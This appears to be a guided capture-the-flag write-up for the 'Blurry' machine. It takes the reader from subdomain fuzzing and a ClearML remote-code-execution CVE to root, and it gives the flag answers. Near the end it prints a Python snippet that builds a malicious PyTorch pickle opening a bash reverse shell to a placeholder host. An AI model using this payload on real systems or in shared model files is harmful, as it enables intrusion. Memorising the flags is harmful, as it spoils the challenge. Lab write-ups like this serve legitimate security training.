## Guided:
**Q:** How many open TCP ports are listening on Blurry?<br>
**A:** 2<br>

**Q:** What open source text communication software is running on a subdomain of blurry.htb?<br>
**A:** RocketChat<br>
> `wfuzz -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil.txt -H "Host: FUZZ.blurry.htb" -u http://app.blurry.htb -t 100 --hc 301,400`

**Q:** What is the tag inside the Black Swan project that will be periodically processed by the admin?<br>
**A:** review <br>

**Q:** What software is running on app.blurry.htb?<br>
**A:** ClearML  (1.13.1-426)<br>

**Q:** What version of ClearML webapp is running on Blurry?<br>
**A:** (1.13.1-426)<br>

**Q:** What is the 2024 CVE ID for a remote code execution vulnerability in this version of ClearML having to do with artifact get.<br>
**A:** CVE-2024-24590 <br>
> [ClearML-RCE](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit/blob/main/exploit.py)

**Q:** What system user is the ClearML application running as on Blurry?<br>
**A:** jippity

**Q:** Submit the flag located in the jippity user's home directory.<br>
**A:** 6adf3dae3feb71dc824c75a158bc02b4

**Q:** What is the full path to the script that jippity can run as root without a password?<br>
**A:** /usr/bin/evaluate_model<br>

**Q:** What Python machine learning library is used to load the given model in evaluate_model?<br>
**A:** PyTorch

**Q:** What decompiler and static code analyzer is used to evaluate if a given Python pickle object is safe enough to run in evaluate_model?<br>
**A:** Flickling<br>
>  Exploit in python used:    (By ippsec)
 ```bash
import os 
import torch
class RevShell:
        def __reduce__(self):
                return (os.system, ("bash -c 'bash -i >& /dev/tcp/<MY-IP>/<My-PORT> 0>&1'",))
torch.save(RevShell(), 'pwn.pth')
```

**Q:** Submit the flag located in the root user's home directory.<br>
**A:** 626e2ca296fc98ee7997d68c8ce28f4e
